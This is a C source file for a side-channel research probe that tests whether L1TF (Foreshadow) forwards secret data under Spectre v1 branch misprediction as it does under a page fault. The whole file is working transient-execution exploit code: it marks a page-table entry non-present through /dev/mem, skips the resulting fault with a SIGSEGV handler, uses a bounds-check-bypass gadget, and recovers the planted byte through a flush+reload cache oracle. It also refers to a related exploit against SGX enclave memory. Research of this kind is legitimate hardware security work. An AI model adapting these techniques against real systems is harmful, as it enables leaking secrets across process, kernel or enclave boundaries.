/*
 * GGSEC modifications and additions:
 * Copyright (C) 2026 Maciej Gojny, GG Advanced IT Security UG
 */
/*
 *  Decisive probe: does an L1TF read forward under BRANCH MISPREDICTION (no
 *  fault) on this i3-6100, the way it does under the fault+skip path?
 *
 *  No enclave, no AEX -- just a normal page read through a non-present alias
 *  (the exact PTE trick foreshadow-ssa-warm uses: remap + MARK_NOT_PRESENT keeps
 *  the PFN, so a read L1TF-forwards the L1-resident data of the original page).
 *  remap_page_table_level opens /dev/mem, so this needs root (sudo).
 *
 *  Two paths against the SAME alias/secret, printed as class-latency vectors:
 *    (A) FAULT path  -- architectural movb on the alias -> #PF -> SIGSEGV skip
 *        handler (like the live leak). Control: this is known to work (64/64
 *        memory-secret leak). Its class-42 slot MUST go hot.
 *    (B) MISPREDICT  -- Kocher bounds-check bypass; the alias is read only in the
 *        mispredicted shadow, never architecturally (no #PF). The question.
 *  If (A) is hot at class 42 and (B) is not, L1TF does not forward in the
 *  misprediction window here -> the fault is needed for the forward, and the
 *  misprediction rewrite cannot remove it. If both are hot, the rewrite is viable.
 *
 *  Build: gcc -O2 -I$HOME/sgx-step l1tf-mp-probe.c -L$HOME/sgx-step/libsgxstep -lsgx-step -o l1tf-mp-probe
 *  Run:   sudo ./l1tf-mp-probe
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>
#include <signal.h>
#include <ucontext.h>
#include <sys/mman.h>

#include "libsgxstep/pt.h"
#include "libsgxstep/cache.h"

#define SLOT   0x1040
#define NCLS   64
#define BOUND_V 16
#define SECRET 0x2a            /* class 42 */
#define OFF    0xfc0           /* page offset -> set 63 (GPRSGX group C) */

char __attribute__((aligned(0x1000))) oracle[SLOT * NCLS];
uint8_t dummy[64];

volatile long bound = BOUND_V;       /* fixed; only ever flushed */

/* ---- fault-path leak (architectural movb + skip handler) ---- */
static void *volatile skip_to;
static volatile unsigned long faults;
static void segv(int s, siginfo_t *si, void *ctx)
{ (void) s; (void) si; faults++; ((ucontext_t *) ctx)->uc_mcontext.gregs[REG_RIP] = (greg_t) skip_to; }

static inline void fault_leak(void *adrs)
{
    asm volatile(
        "   lea 2f(%%rip), %%rax\n\t mov %%rax, %0\n\t"
        "1: movb (%1), %%al\n\t movzbl %%al, %%eax\n\t and $0x3f, %%eax\n\t"
        "   imul %3, %%rax\n\t movq (%2, %%rax), %%rdi\n\t 2:\n\t"
        : "=m"(skip_to) : "r"(adrs), "r"(oracle), "r"((unsigned long) SLOT)
        : "rax", "rdi", "memory");
}

/* ---- misprediction leak (Kocher; branchless idx+rbase select) ---- */
static void __attribute__((noinline)) mp_gadget(long idx, uint8_t *rbase)
{
    if (idx < bound) {
        unsigned v = rbase[idx];
        maccess(oracle + (size_t)(v & 0x3f) * SLOT);
    }
}
static void mp_round(long mal_idx, uint8_t *mal_rbase)
{
    for (int j = 29; j >= 0; j--) {
        flush((void *) &bound);
        for (volatile int z = 0; z < 100; z++) { }
        long sel = ((j % 6) - 1) & ~0xFFFFL; sel = (sel | (sel >> 16));  /* -1 mal, 0 train */
        long idx = 0 ^ (sel & (mal_idx ^ 0));
        uint8_t *rb = (uint8_t *)(((intptr_t) dummy) ^ (sel & (((intptr_t) mal_rbase) ^ (intptr_t) dummy)));
        mp_gadget(idx, rb);
    }
}

static inline int set_of(void *p) { return (int)(((uint64_t) p >> 6) & 63); }

static void report(const char *tag, double *avg, int iters)
{
    printf("== %s (secret class 42, %d iters) ==\n", tag, iters);
    for (int c = 0; c < NCLS; c++) {
        printf(" c%02d=%4.0f%s", c, avg[c] / iters, c == 42 ? "<42" : (c == 63 ? "<c*" : ""));
        if ((c & 7) == 7) printf("\n");
    }
}

int main(void)
{
    cpu_set_t s; CPU_ZERO(&s); CPU_SET(1, &s); sched_setaffinity(0, sizeof(s), &s);
    for (int i = 0; i < 64; i++) dummy[i] = 0;   /* train touches class 0 */

    struct sigaction sa; memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = segv; sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigaction(SIGSEGV, &sa, NULL);

    /* original present page + its non-present alias (keeps PFN) */
    uint8_t *orig = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    orig[OFF] = SECRET;
    uint8_t *alias = remap_page_table_level(orig, PAGE);
    void *alias_pg = (void *) ((uintptr_t) alias & ~0xfffUL);
    uint64_t *pte = remap_page_table_level(alias, PTE);
    uint64_t saved = *pte;
    mprotect(alias_pg, 0x1000, PROT_NONE);
    *pte = MARK_NOT_PRESENT(saved);
    uint8_t *alias_byte = alias + OFF;

    printf("l1tf-mp-probe: alias %p (set %d), orig %p, secret 0x%02x class %d\n",
           (void *) alias_byte, set_of(alias_byte), (void *) orig, SECRET, SECRET & 0x3f);

    int iters = 4000;
    static double avgF[NCLS], avgM[NCLS];

    /* (A) fault path */
    for (int c = 0; c < NCLS; c++) avgF[c] = 0;
    for (int r = 0; r < iters; r++) {
        orig[OFF] = SECRET;                        /* warm the L1 line (via present orig) */
        for (int c = 0; c < NCLS; c++) flush(oracle + (size_t) c * SLOT);
        fault_leak(alias_byte);                    /* architectural -> #PF -> skip; transient touch */
        for (int c = 0; c < NCLS; c++) avgF[c] += (double) reload(oracle + (size_t) c * SLOT);
    }

    /* (B) misprediction path */
    for (int c = 0; c < NCLS; c++) avgM[c] = 0;
    long mal_idx = 64;                             /* >= bound -> not-taken -> mispredict */
    uint8_t *mal_rbase = alias_byte - mal_idx;     /* rbase[64] == alias_byte */
    for (int r = 0; r < iters; r++) {
        orig[OFF] = SECRET;
        for (int c = 0; c < NCLS; c++) flush(oracle + (size_t) c * SLOT);
        mp_round(mal_idx, mal_rbase);
        for (int c = 0; c < NCLS; c++) avgM[c] += (double) reload(oracle + (size_t) c * SLOT);
    }

    report("(A) FAULT path (control -- must be hot at 42)", avgF, iters);
    report("(B) MISPREDICT (the question)", avgM, iters);
    printf("skip-handler faults during fault path = %lu (expect ~%d)\n", faults, iters);

    *pte = saved;   /* restore */
    return 0;
}
